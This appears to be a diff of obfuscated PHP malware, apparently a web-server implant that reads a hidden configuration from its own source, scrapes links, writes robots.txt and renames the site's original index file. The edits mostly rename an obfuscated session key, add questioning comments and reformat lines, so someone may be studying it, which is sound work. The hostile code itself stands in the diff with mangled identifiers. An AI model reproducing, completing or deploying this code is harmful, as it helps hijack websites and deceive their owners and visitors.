@@ -139,8 +139,8 @@ exit();
 */
 
 
-//preg_match(l1FLe62h("K/@mJB3pOxjmNx8y"),$bbbb66b6,$_SESSION["oO0Oo0OO0"]);
-preg_match("/@'(.*?)';/s",$source,$_SESSION["oO0Oo0OO0"]);
+// Why store in session?
+preg_match("/@'(.*?)';/s",$source,$_SESSION["config"]);
 // Store function/variable in session?
 
 //print_r($_SESSION);
@@ -704,6 +704,8 @@ function decode_URL($l1qMwO){
 }
 
 function l1BSTEtn($l1bC){
+    //echo "CALL ME: {$l1bC} \n";
+
     global $l1Ni6;
     $l16Hy2G = array();
     preg_match_all("/<a.*?href=['\"]?(.*?)['\"\s>]/si",$l1bC,$l1TJWV);
@@ -761,8 +763,9 @@ function l1P9LVD($l15tGX=''){
 
     write_robots_txt($l1I);
 
-    if(isset($_SESSION["oO0Oo0OO0"])){
-        $l1PwXxhM = $_SESSION["oO0Oo0OO0"];
+    /* Load config */
+    if(isset($_SESSION["config"])){
+        $l1PwXxhM = $_SESSION["config"];
     }else{
         preg_match("/@'\\\$(.*?)';/s",file_get_contents(__FILE__),$l1PwXxhM);
     }
@@ -770,14 +773,13 @@ function l1P9LVD($l15tGX=''){
     $l1PwXxhM = (is_array($l1PwXxhM) && isset($l1PwXxhM[1])) ? trim($l1PwXxhM[1]) : '';
     $l1fV3E = array();
 
-    if($l1PwXxhM!=''){
-        $l1PwXxhM=explode("\n",$l1PwXxhM);
+    if($l1PwXxhM != ''){
+        $l1PwXxhM = explode("\n",$l1PwXxhM);
         foreach($l1PwXxhM as $l17L){
             $l17L=trim($l17L);
 
-            if($l17L==''){
-                continue;
-            }
+            if($l17L=='') continue;
+
             preg_match("/^\w+=(.*)/si",$l17L,$l12VVPcc);
             if(isset($l12VVPcc[1])){
                 $l1fV3E[]=$l12VVPcc[1];
@@ -786,7 +788,7 @@ function l1P9LVD($l15tGX=''){
         if(count($l1fV3E)!=10){
             exit("cfg_params_error");
         }
-        list($l1Qhzk2,$l1go,$l1GRfrF8,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l1VQ,$l11ufJ,$l1EbALe,$l1h)=$l1fV3E;
+        list($l1Qhzk2,$l1go,$l1GRfrF8,$l1fCx83H,$l1VtbCwB,$l1Vvtr,$l1VQ,$l11ufJ,$l1EbALe,$l1h) = $l1fV3E;
     }
 
     $l1Qhzk2 = trim($l1Qhzk2);
@@ -814,8 +816,8 @@ function l1P9LVD($l15tGX=''){
 
     $l1ekHESi = $l1c9 = isset($_SERVER["REQUEST_URI"])?$_SERVER["REQUEST_URI"]:(isset($_SERVER["QUERY_STRING"])?$_SERVER["QUERY_STRING"]:'');
     $l1ekHESi = $l1c9 = ($l1ekHESi==''?((isset($_SERVER["PATH_INFO"])&&$_SERVER["PATH_INFO"]!='')?$_SERVER["PATH_INFO"]:$l1ekHESi):$l1ekHESi);
-    $l1i=$l1f1oojq.$l1ekHESi;
-    $l1bS3es='';
+    $l1i = $l1f1oojq.$l1ekHESi;
+    $l1bS3es = '';
 
 
     /* Rename original index file */
